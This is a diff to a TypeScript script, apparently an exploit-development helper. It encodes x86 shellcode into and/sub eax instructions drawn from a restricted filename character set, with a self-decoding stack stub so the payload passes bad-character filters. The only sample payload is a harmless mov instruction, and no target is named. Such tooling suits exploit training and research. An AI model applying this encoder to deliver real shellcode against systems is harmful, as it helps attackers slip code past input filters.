@@ -25,6 +25,16 @@ function sub(a: number, b: number) {
     return Uint32Array.from([a - b])[0]
 }
 
+function parseShellcode(shellcode: string): string {
+    let output = ''
+    output += shellcode
+        .split('\\x')
+        .filter(a => a)
+        .map(c => String.fromCharCode(parseInt(c, 16)))
+        .join('')
+    return output
+}
+
 function getSingleZeroAndEax2(allowedChars: string): [number, number] {
     const allowedCharsArray = allowedChars.split('')
     for (let i = 0; i < allowedCharsArray.length; i++) {
@@ -57,7 +67,7 @@ function getSingleSubEncode(value: number, previousRemainder: number, allowedCha
                 let a = allowedCharsArray[i].charCodeAt(0),
                     b = allowedCharsArray[j].charCodeAt(0),
                     c = allowedCharsArray[k].charCodeAt(0)
-                
+
                 let res = sub(sub(sub(0, a), b), c)
 
                 if (and(res, 0xff) === value) {
@@ -91,13 +101,69 @@ function getSubEncode(value: number, allowedChars: string, length = 4): [number,
     return [a, b, c]
 }
 
+function encodeValueInEAX(value: number): string {
+    const [a, b] = getZeroAndEax2(FILENAME_CHARS)
+    const [c, d, e] = getSubEncode(value, FILENAME_CHARS)
+    let output = ''
+    output += `and eax, ${hex(a)}\n`
+    output += `and eax, ${hex(b)} ; eax = ${hex(and(a, b))}\n`
+    output += `sub eax, ${hex(c)}\n`
+    output += `sub eax, ${hex(d)}\n`
+    output += `sub eax, ${hex(e)} ; eax = ${hex(sub(sub(sub(0, c), d), e))}\n`
+    return output
+}
 
-const value = process.argv[2] ? parseInt(process.argv[2], 16) : 0xdeadbeef
-console.log(`encoding ${hex(value)}\n`)
-const [a, b] = getZeroAndEax2(FILENAME_CHARS)
-const [c, d, e] = getSubEncode(value, FILENAME_CHARS)
-console.log(`and eax, ${hex(a)}`)
-console.log(`and eax, ${hex(b)} ; eax = ${hex(and(a, b))}`)
-console.log(`sub eax, ${hex(c)}`)
-console.log(`sub eax, ${hex(d)}`)
-console.log(`sub eax, ${hex(e)} ; eax = ${hex(sub(sub(sub(0, c), d), e))}`)
+function addToEAX(value: number): string {
+    const [c, d, e] = getSubEncode(value, FILENAME_CHARS)
+    let output = ''
+    output += `sub eax, ${hex(c)}\n`
+    output += `sub eax, ${hex(d)}\n`
+    output += `sub eax, ${hex(e)} ; eax += ${hex(sub(sub(sub(0, c), d), e))}\n`
+    return output
+}
+
+function encodeShellcode(shellcode: string) {
+    const paddedShellcode = shellcode.padEnd(shellcode.length + (4 - (shellcode.length % 4)), '\x42')
+    const reversedShellcode = paddedShellcode.split('').reverse().join('')
+    let output = ''
+    let stubLength = 0
+    // metasm >
+    output += `push eax\n` // \x50
+    stubLength += 1
+    output += `pop ebx\n` // \x59
+    stubLength += 1
+    output += `ADD_EAX_PLACEHOLDER`
+    stubLength += 15
+    output += "push eax\n" // \x51
+    stubLength += 1
+    output += "pop esp\n" // \x5c
+    stubLength += 1
+
+    for (let i = 0; i < reversedShellcode.length; i += 4) {
+        let value = 0
+        for (let j = 0; j < 4; j++) {
+            value = (value << 8) | reversedShellcode.substr(i + j, 1).charCodeAt(0)
+        }
+
+        output += encodeValueInEAX(value)
+        output += `push eax\n` // \x50
+        stubLength += 26
+    }
+
+    output = output.replace('ADD_EAX_PLACEHOLDER', addToEAX(stubLength + reversedShellcode.length))
+    output += 'dec ecx\n'.repeat(reversedShellcode.length) // \x49 NOPs to be filled with decoded shellcode
+    console.log(`payload length: ${stubLength * 2 + reversedShellcode.length}`)
+    return output
+}
+
+let shellcode = ''
+// metasm > jmp eax
+//shellcode += '\xff\xe0'
+
+// metasm > mov eax, 0x11223344
+//shellcode += '\xb8\x44\x33\x22\x11'
+shellcode += '\\xb8\\x44\\x33\\x22\\x11'
+
+console.log(encodeValueInEAX(0xdeadbeef))
+
+console.log(encodeShellcode(parseShellcode(shellcode)))
